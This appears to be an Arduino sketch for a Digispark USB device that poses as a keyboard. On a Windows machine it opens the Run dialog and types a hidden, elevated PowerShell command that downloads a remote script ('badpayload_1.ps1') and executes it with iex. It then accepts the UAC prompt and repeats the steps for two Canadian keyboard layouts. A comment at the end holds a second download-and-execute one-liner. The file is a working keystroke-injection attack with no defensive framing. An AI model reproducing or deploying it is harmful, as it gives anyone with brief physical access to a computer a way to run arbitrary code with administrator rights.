#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}

// Must ! https://www.kbdlayout.info/kbdca/scancodes

const char payload [] = "powershell saps powershell '$a=iwr -useb https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/badpayload_1.ps1; iex $a' -Verb runAs -WindowStyle Hidden";

void loop() {
  
  // --- Canada French ---\\.

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1200);

   int len = strlen(payload);
    for (int i=0;i<len;i++) {
      if(payload[i] == '/'){
        DigiKeyboard.sendKeyStroke(MOD_SHIFT_RIGHT, KEY_3);
      }
      else if (payload[i] == '\''){
        DigiKeyboard.sendKeyStroke(0x36, MOD_SHIFT_RIGHT);
      }
      else
      {
        DigiKeyboard.print((char) payload[i]);
      }
      DigiKeyboard.delay(0);
    }

    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(1200);


    // --- Canada Multi Language ---\\.
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1200);

    int len1 = strlen(payload);
      for (int i=0;i<len1;i++) {
        if(payload[i] == '/'){
          DigiKeyboard.write(0x60);
        } else if (payload[i] == '\''){
        DigiKeyboard.sendKeyStroke(0x36, MOD_SHIFT_RIGHT);
        }
        else
        {
          DigiKeyboard.print((char) payload[i]);
        }
        DigiKeyboard.delay(0);
      }

    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    exit(0);
    }

  // DigiKeyboard.sendKeyStroke(0x36, MOD_SHIFT_RIGHT); '
  // DigiKeyboard.sendKeyStroke(0x35, MOD_SHIFT_RIGHT); Pipe
  // slash in multi language is: 0x60
  //powershell -W Minimized -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/badpayload_1.ps1 -UseBasicParsing; Invoke-Expression $a
